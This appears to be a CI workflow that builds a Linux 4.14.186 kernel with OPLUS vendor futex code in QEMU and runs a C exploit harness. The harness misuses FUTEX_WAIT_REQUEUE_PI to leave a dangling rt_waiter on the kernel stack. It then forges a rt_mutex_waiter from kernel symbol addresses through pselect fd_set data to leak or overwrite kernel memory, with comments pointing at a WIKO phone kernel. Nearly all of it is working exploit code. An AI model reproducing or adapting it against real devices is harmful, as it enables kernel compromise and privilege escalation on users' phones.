name: qemu-ghostlock-v10

on:
  workflow_dispatch:

jobs:
  qemu-ghostlock:
    runs-on: ubuntu-24.04
    steps:
      - name: Checkout OPLUS futex sources (sparse)
        uses: actions/checkout@v4
        with:
          sparse-checkout: |
            kernel/futex.c
            kernel/locking/rtmutex.c
            kernel/locking/rtmutex_common.h
          sparse-checkout-cone-mode: false

      - name: Fetch generic 4.14.186
        run: |
          curl -sL https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.14.186.tar.xz -o k.tar.xz
          tar xJf k.tar.xz
          mv linux-4.14.186 linux-g

      - name: Swap in OPLUS futex/rtmutex
        run: |
          cp kernel/futex.c linux-g/kernel/futex.c
          cp kernel/locking/rtmutex.c linux-g/kernel/locking/rtmutex.c
          cp kernel/locking/rtmutex_common.h linux-g/kernel/locking/rtmutex_common.h
          echo "swap markers:"
          grep -c "rt_mutex_start_proxy_lock" linux-g/kernel/futex.c linux-g/kernel/locking/rtmutex.c

      - name: Instrument kernel (anchors + ghost delta)
        run: |
          python3 << 'PYEOF'
          # 1) globalize boot_id buffer（OPLUS/stock 4.14.186 在 drivers/char/random.c，
          #    变量名 sysctl_bootid，类型 static char —— WIKO System.map 同名实锤）
          boot_name = None
          target_file = None
          for fn in ('linux-g/drivers/char/random.c', 'linux-g/kernel/random.c', 'linux-g/kernel/sysctl.c'):
              try:
                  s = open(fn).read()
              except IOError:
                  continue
              for cand in ('sysctl_bootid', 'boot_id'):
                  for typ in ('static char %s', 'static unsigned char %s'):
                      decl = typ % cand
                      if decl in s:
                          boot_name = cand
                          target_file = fn
                          s = s.replace(decl,
                                        'unsigned char ghostlock_bootid_%s' % cand)
                          s = s.replace('&%s' % cand, '&ghostlock_bootid_%s' % cand)
                          if 'ghostlock_scratch' not in s:
                              s += '\nunsigned long ghostlock_scratch[8] __attribute__((aligned(64)));\n'
                          open(fn, 'w').write(s)
                          break
                  if boot_name:
                      break
              if boot_name:
                  break
          assert boot_name, 'boot_id buffer not found'
          print('boot buffer:', boot_name, 'in', target_file)

          # 2) ghost delta capture: futex_wait_requeue_pi 的栈局部 rt_waiter
          #    地址写进全局 ghostlock_scratch[0]（System.map 有符号，repro 已知地址）
          f = open('linux-g/kernel/futex.c').read()
          if 'extern unsigned long ghostlock_scratch' not in f:
              fidx = f.find('#include')
              feol = f.find('\n', fidx)
              f = f[:feol+1] + '\nextern unsigned long ghostlock_scratch[8];\n' + f[feol+1:]
          needle = 'struct rt_mutex_waiter rt_waiter;'
          cnt = f.count(needle)
          if cnt >= 2:
              # 第二个声明是 futex_wait_requeue_pi 里的（第一个是 futex_lock_pi 路径）
              idx = f.rfind(needle)
              cap = ("\n\tpr_info(\"DBG rt_waiter=%px\\n\", &rt_waiter);\n"
                     "\tghostlock_scratch[0] = (unsigned long)&rt_waiter;")
              f = f[:idx+len(needle)] + cap + f[idx+len(needle):]
              print('futex.c rt_waiter capture OK (total decls=%d)' % cnt)
          elif cnt == 1:
              f = f.replace(needle, needle + '\n\tpr_info("DBG rt_waiter=%px\\n", &rt_waiter);', 1)
              print('futex.c rt_waiter capture OK (single decl)')
          else:
              print('futex.c rt_waiter capture WARN: needle missing')
          open('linux-g/kernel/futex.c','w').write(f)

          # 3) stack_fds capture in fs/select.c core_sys_select：局部变量叫 fds
          #    （4.14 的 core_sys_select 里是 fd_set_bits fds），写进 ghostlock_scratch[1]
          #    并打印 DBG delta —— console 直接可见，guest 内不依赖 /dev/kmsg 回读
          g = open('linux-g/fs/select.c').read()
          if 'extern unsigned long ghostlock_scratch' not in g:
              gidx = g.find('#include')
              geol = g.find('\n', gidx)
              g = g[:geol+1] + '\nextern unsigned long ghostlock_scratch[8];\n' + g[geol+1:]
          done = False
          for needle in ('ret = do_select(n, &fds, end_time);',
                         'ret = do_select(n, &fds, &end_time);'):
              if needle in g:
                  cap = ("pr_info(\"DBG stack_fds=%px\\n\", &fds);\n\t"
                         "ghostlock_scratch[1] = (unsigned long)&fds;\n\t"
                         "pr_info(\"DBG delta=%ld\\n\","
                         " (long)ghostlock_scratch[1] - (long)ghostlock_scratch[0]);\n\t"
                         + needle)
                  g = g.replace(needle, cap, 1)
                  open('linux-g/fs/select.c', 'w').write(g)
                  done = True
                  break
          print('select.c stack_fds capture:', 'OK' if done else 'WARN')
          import subprocess
          print('--- injected select.c lines ---')
          subprocess.run(['grep', '-n', 'DBG ', 'linux-g/fs/select.c'])
          print('--- injected futex.c line ---')
          subprocess.run(['grep', '-n', 'ghostlock_scratch', 'linux-g/kernel/futex.c'])

          # 4) proxy lock + requeue markers (keep v9 instrumentation)
          reps = [
            ('return ret ? ret : task_count;',
             'pr_info("FUTEX-DBG requeue-end ret=%d task_count=%d\\n", ret, task_count);\n\treturn ret ? ret : task_count;'),
            ('ret = rt_mutex_start_proxy_lock(',
             'pr_info("FUTEX-DBG proxy_lock call\\n");\n\t\t\tret = rt_mutex_start_proxy_lock('),
          ]
          for a, b in reps:
              if a in f and b.split('\n')[0] not in f:
                  f = f.replace(a, b)
          open('linux-g/kernel/futex.c','w').write(f)
          print('futex instrumentation done')
          PYEOF

      - name: Install cross toolchain + qemu
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq gcc-aarch64-linux-gnu qemu-system-aarch64 cpio

      - name: Configure and build kernel
        run: |
          cd linux-g
          make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- defconfig
          scripts/config --enable CONFIG_FUTEX_PI
          scripts/config --enable CONFIG_RT_MUTEXES
          scripts/config --enable CONFIG_BLK_DEV_INITRD
          make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- olddefconfig
          make -j$(nproc) ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- Image > kbuild.log 2>&1 || {
            echo "=== BUILD FAILED, errors: ==="
            grep -E "error:|undefined reference" kbuild.log | head -30
            exit 1
          }
          echo "=== build OK ==="
          tail -3 kbuild.log
          ls -la arch/arm64/boot/Image
          grep -E " init_task$" System.map
          grep -E "ghostlock_bootid|ghostlock_scratch" System.map

      - name: Build static repro and init
        run: |
          cd linux-g
          INIT_TASK=$(grep ' init_task$' System.map | awk '{print $1}')
          BOOT_ID=$(grep 'ghostlock_bootid' System.map | awk '{print $1}')
          SCRATCH=$(grep 'ghostlock_scratch' System.map | awk '{print $1}')
          echo "INIT_TASK=$INIT_TASK BOOT_ID=$BOOT_ID SCRATCH=$SCRATCH"
          mkdir -p ../initramfs/proc ../initramfs/dev ../initramfs/sys
          cat > ../initramfs/repro.c << EOF
          #define _GNU_SOURCE
          #include <stdio.h>
          #include <stdint.h>
          #include <string.h>
          #include <errno.h>
          #include <unistd.h>
          #include <pthread.h>
          #include <sys/syscall.h>
          #include <linux/futex.h>
          #include <linux/sched.h>
          #include <sys/select.h>
          #include <sys/syslog.h>
          #include <time.h>
          #include <fcntl.h>
          #include <stdlib.h>

          #define ANCHOR_COMM   (0x${INIT_TASK}ULL + 0x7e0)
          #define ANCHOR_BOOTID  0x${BOOT_ID}ULL
          #define ANCHOR_INIT    0x${INIT_TASK}ULL
          #define ANCHOR_SCRATCH 0x${SCRATCH}ULL

          struct sched_attr_x {
            uint32_t size; uint32_t sched_policy; uint64_t sched_flags;
            int32_t sched_nice; uint32_t sched_priority;
            uint64_t sched_runtime; uint64_t sched_deadline; uint64_t sched_period;
          };

          static long futex(uint32_t *uaddr, int op, uint32_t val,
                            const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3) {
            return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
          }
          static uint32_t f_wait[8], f_pi_target[8], f_pi_chain[8];
          static volatile int owner_has_target, waiter_has_chain, waiter_waiting,
                             owner_started, route_done, owner_chain_done,
                             ghost_go, consumer_done;
          static volatile int waiter_tid, word_shift, dance_idx;

          static void read_bootid(unsigned char out[16]) {
            int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
            memset(out, 0, 16);
            if (fd >= 0) { char buf[64]; ssize_t n = read(fd, buf, sizeof(buf)-1);
              if (n > 0) { buf[n] = 0; unsigned char raw[16]; int nib=-1, o=0;
                for (ssize_t i=0; i<n && o<16; i++) { int v;
                  char c=buf[i];
                  v = (c>='0'&&c<='9')?c-'0':(c>='a'&&c<='f')?c-'a'+10:(c>='A'&&c<='F')?c-'A'+10:-1;
                  if (v<0) continue; if (nib<0){nib=v;continue;} raw[o++]=(unsigned char)((nib<<4)|v); nib=-1; }
                if (o==16) memcpy(out, raw, 16); }
              close(fd); }
          }

          static void *consumer_fn(void *a) {
            while (!ghost_go) usleep(1000);
            usleep(50000);
            struct sched_attr_x attr;
            memset(&attr, 0, sizeof(attr));
            attr.size = sizeof(attr);
            attr.sched_policy = SCHED_NORMAL;
            attr.sched_nice = 1;
            long r = syscall(SYS_sched_setattr, waiter_tid, &attr, 0);
            printf("REPRO consumer sched_setattr tid=%d ret=%ld errno=%d idx=%d\n", waiter_tid, r, errno, dance_idx);
            consumer_done = 1;
            return NULL;
          }

          static void do_ghost_pselect(void) {
            int words_per_set = (320 + 63) / 64;
            int pipefd[2];
            pipe(pipefd);
            int block_fd = syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
            if (block_fd < 0) block_fd = pipefd[0];
            int high_read = fcntl(block_fd, F_DUPFD, 320 + 16);
            fd_set in, out, ex;
            FD_ZERO(&in); FD_ZERO(&out); FD_ZERO(&ex);
            unsigned long *bits;
            /* WIKO rt_mutex_waiter 80B 布局（pahole）：
               0 tree_pc(comm) 1 tree_right(0) 2 tree_left(bootid)
               3 pi_pc(comm) 4 pi_right(0) 5 pi_left(bootid)
               6 task(init) 7 lock(scratch) 8 prio(130) 9 deadline(0) */
            struct { int w; unsigned long v; } words[] = {
              {0, ANCHOR_COMM}, {1, 0}, {2, ANCHOR_BOOTID},
              {3, ANCHOR_COMM}, {4, 0}, {5, ANCHOR_BOOTID},
              {6, ANCHOR_INIT}, {7, ANCHOR_SCRATCH}, {8, 130}, {9, 0},
            };
            for (unsigned i = 0; i < sizeof(words)/sizeof(words[0]); i++) {
              int gw = word_shift + words[i].w;
              int set_idx = gw / words_per_set;
              int w_idx = gw % words_per_set;
              if (set_idx == 0) { bits = (unsigned long *)&in; bits[w_idx] = words[i].v; }
              else if (set_idx == 1) { bits = (unsigned long *)&out; bits[w_idx] = words[i].v; }
              else if (set_idx == 2) { bits = (unsigned long *)&ex; bits[w_idx] = words[i].v; }
            }
            for (int fd = 0; fd < 320; fd++) {
              if (FD_ISSET(fd, &in) || FD_ISSET(fd, &out) || FD_ISSET(fd, &ex))
                dup2(high_read, fd);
            }
            dup2(high_read, 319);
            FD_SET(319, &ex);
            struct timespec ts = { .tv_sec = 3, .tv_nsec = 0 };
            printf("REPRO pselect enter shift=%d idx=%d\n", word_shift, dance_idx);
            ghost_go = 1;
            int r = pselect(320, &in, &out, &ex, &ts, NULL);
            printf("REPRO pselect ret=%d errno=%d shift=%d\n", r, errno, word_shift);
          }

          static void *waiter_fn(void *a) {
            int idx = dance_idx;
            waiter_tid = (int)syscall(SYS_gettid);
            long r = futex(&f_pi_chain[idx], FUTEX_LOCK_PI, 0, NULL, NULL, 0);
            printf("REPRO waiter LOCK_PI chain ret=%ld errno=%d idx=%d\n", r, errno, idx);
            __sync_synchronize(); waiter_has_chain = 1;
            while (!owner_has_target) usleep(1000);
            struct timespec ts = { .tv_sec = 10 };
            __sync_synchronize(); waiter_waiting = 1;
            r = futex(&f_wait[idx], FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target[idx], 0);
            printf("REPRO waiter WAIT_REQUEUE_PI ret=%ld errno=%d idx=%d\n", r, errno, idx);
            do_ghost_pselect();
            __sync_synchronize(); route_done = 1;
            r = futex(&f_pi_chain[idx], FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            printf("REPRO waiter UNLOCK_PI ret=%ld errno=%d idx=%d\n", r, errno, idx);
            while (!owner_chain_done) usleep(1000);
            for (;;) sleep(60);   /* 永不退出：dangling pi_blocked_on 活着 */
            return NULL;
          }

          static void *owner_fn(void *a) {
            int idx = dance_idx;
            long r = futex(&f_pi_target[idx], FUTEX_LOCK_PI, 0, NULL, NULL, 0);
            printf("REPRO owner LOCK_PI target ret=%ld errno=%d idx=%d\n", r, errno, idx);
            __sync_synchronize(); owner_has_target = 1;
            while (!waiter_has_chain) usleep(1000);
            __sync_synchronize(); owner_started = 1;
            r = futex(&f_pi_chain[idx], FUTEX_LOCK_PI, 0, NULL, NULL, 0);
            printf("REPRO owner LOCK_PI chain ret=%ld errno=%d idx=%d\n", r, errno, idx);
            __sync_synchronize(); owner_chain_done = 1;
            for (;;) sleep(60);
            return NULL;
          }

          static long run_measure(int idx) {
            /* 纯测距：无 owner/consumer/requeue —— 只触发 rt_waiter/stack_fds 打印 */
            word_shift = 0;
            dance_idx = idx;
            owner_has_target = 1;   /* 模拟 owner，让 waiter 走完流程 */
            waiter_has_chain = waiter_waiting = 0;
            route_done = 0;
            owner_chain_done = 1;
            ghost_go = consumer_done = 0;
            pthread_t w;
            pthread_create(&w, NULL, waiter_fn, NULL);
            while (!route_done) usleep(10000);
            return 0;
          }

          static long run_dance(int idx, int shift) {
            word_shift = shift;
            dance_idx = idx;
            owner_has_target = waiter_has_chain = waiter_waiting = 0;
            owner_started = route_done = owner_chain_done = 0;
            ghost_go = consumer_done = 0;
            pthread_t o, w, c;
            pthread_create(&o, NULL, owner_fn, NULL);
            usleep(200000);
            pthread_create(&w, NULL, waiter_fn, NULL);
            pthread_create(&c, NULL, consumer_fn, NULL);
            while (!waiter_waiting || !owner_started) usleep(1000);
            usleep(100000);
            long rq = -1; int edeadlk = 0;
            for (int i = 1; i <= 3; i++) {
              errno = 0;
              rq = futex(&f_wait[idx], FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target[idx], 0);
              printf("REPRO try=%d CMP_REQUEUE_PI ret=%ld errno=%d idx=%d\n", i, rq, errno, idx);
              if (errno == 35) { edeadlk = 1; break; }
              if (rq >= 1) break;
              sleep(1);
            }
            while (!route_done) usleep(10000);
            sleep(1);
            return edeadlk ? 35 : rq;
          }

          static void find_delta(unsigned long *qwaiter, unsigned long *sfds, long *pdelta) {
            *qwaiter = *sfds = 0; *pdelta = 0;
            /* SYSLOG_ACTION_READ_ALL(3): 读整个 ring buffer，非消费、无 <n> 前缀 */
            long sz = syscall(SYS_syslog, 3, NULL, 0);
            if (sz <= 0 || sz > (1<<20)) {
              printf("REPRO klog size fail sz=%ld errno=%d\n", sz, errno);
              return;
            }
            char *buf = malloc((size_t)sz + 1);
            if (!buf) { printf("REPRO malloc fail\n"); return; }
            long n = syscall(SYS_syslog, 3, buf, (int)sz);
            if (n < 0) { printf("REPRO klog read fail n=%ld errno=%d\n", n, errno); free(buf); return; }
            buf[n] = 0;
            char *p = buf;
            while ((p = strstr(p, "DBG delta=")) != NULL) {
              *pdelta = strtol(p + 10, NULL, 10);
              p += 10;
            }
            p = buf;
            while ((p = strstr(p, "DBG rt_waiter=")) != NULL) {
              *qwaiter = strtoull(p + 14, NULL, 16);
              p += 14;
            }
            p = buf;
            while ((p = strstr(p, "DBG stack_fds=")) != NULL) {
              *sfds = strtoull(p + 14, NULL, 16);
              p += 14;
            }
            printf("REPRO delta parse q_waiter=%016lx stack_fds=%016lx klog_delta=%ld klog_bytes=%ld\n",
                   *qwaiter, *sfds, *pdelta, n);
            if (!*qwaiter) {   /* debug: dump tail of klog */
              printf("REPRO klog tail: %.600s\n", buf + (n > 600 ? n - 600 : 0));
            }
            free(buf);
          }

          int main(void) {
            unsigned char before[16], after[16];
            read_bootid(before);
            printf("REPRO bootid before: %02x%02x%02x%02x%02x%02x%02x%02x-%02x%02x%02x%02x%02x%02x%02x%02x\n",
                   before[0],before[1],before[2],before[3],before[4],before[5],before[6],before[7],
                   before[8],before[9],before[10],before[11],before[12],before[13],before[14],before[15]);

            printf("REPRO measure\n");
            run_measure(0);

            unsigned long qwaiter = 0, sfds = 0; long pdelta = 0;
            find_delta(&qwaiter, &sfds, &pdelta);
            int shift = -1;
            if (pdelta > 0 && (pdelta % 8) == 0 && (pdelta / 8) < 40) {
              shift = (int)(pdelta / 8);
              printf("REPRO computed shift=%d (from klog delta=%ld)\n", shift, pdelta);
            } else if (qwaiter && sfds) {
              long d = (long)(qwaiter - sfds);
              printf("REPRO raw delta=%ld\n", d);
              if (d >= 0 && (d % 8) == 0 && (d / 8) < 40)
                shift = (int)(d / 8);
            }
            printf("REPRO computed shift=%d\n", shift);
            if (shift < 0) {
              printf("REPRO delta NEGATIVE/out-of-range, abort before crash\n");
              return 0;
            }

            printf("REPRO dance2 shift=%d\n", shift);
            run_dance(1, shift);

            read_bootid(after);
            printf("REPRO bootid after:  %02x%02x%02x%02x%02x%02x%02x%02x-%02x%02x%02x%02x%02x%02x%02x%02x\n",
                   after[0],after[1],after[2],after[3],after[4],after[5],after[6],after[7],
                   after[8],after[9],after[10],after[11],after[12],after[13],after[14],after[15]);
            unsigned long long leaked = 0;
            for (int i = 0; i < 8; i++) leaked |= (unsigned long long)after[i] << (i*8);
            printf("REPRO leaked=%016llx expect_comm=%016llx\n", leaked, (unsigned long long)ANCHOR_COMM);
            printf("REPRO done\n");
            return 0;
          }
          EOF
          aarch64-linux-gnu-gcc -static -O2 -pthread ../initramfs/repro.c -o ../initramfs/repro
          cat > ../initramfs/init.c << 'EOF2'
          #include <sys/syscall.h>
          #include <sys/mount.h>
          #include <sys/reboot.h>
          #include <sys/stat.h>
          #include <unistd.h>
          #include <stdio.h>
          int main(void) {
            mkdir("/proc", 0755); mkdir("/dev", 0755); mkdir("/sys", 0755);
            syscall(SYS_mount, "proc", "/proc", "proc", 0, 0);
            syscall(SYS_mount, "devtmpfs", "/dev", "devtmpfs", 0, 0);
            syscall(SYS_mount, "sysfs", "/sys", "sysfs", 0, 0);
            printf("=== QEMU ghostlock v10 start ===\n");
            fflush(stdout);
            execl("/repro", "repro", NULL);
            printf("exec failed\n");
            syscall(SYS_reboot, 0xfee1dead, 672274793, 0x4321fedc, NULL);
            return 0;
          }
          EOF2
          aarch64-linux-gnu-gcc -static -O2 ../initramfs/init.c -o ../initramfs/init
          cd ../initramfs && find . | cpio -o -H newc | gzip > ../initramfs.cpio.gz
          ls -la ../initramfs.cpio.gz

      - name: Run QEMU test
        timeout-minutes: 6
        run: |
          timeout 240 qemu-system-aarch64 \
            -M virt -cpu cortex-a57 -m 512M -smp 4 -nographic -no-reboot \
            -kernel linux-g/arch/arm64/boot/Image \
            -initrd initramfs.cpio.gz \
            -append "console=ttyAMA0 earlycon rdinit=/init" > qemu.log 2>&1 || true
          echo "=== QEMU log (REPRO + DBG) ==="
          grep -E "REPRO|DBG|FUTEX-DBG" qemu.log | head -80
          echo "=== TAIL ==="
          tail -20 qemu.log

      - name: Upload QEMU log
        uses: actions/upload-artifact@v4
        with:
          name: qemu-ghostlock-v10-log
          path: qemu.log
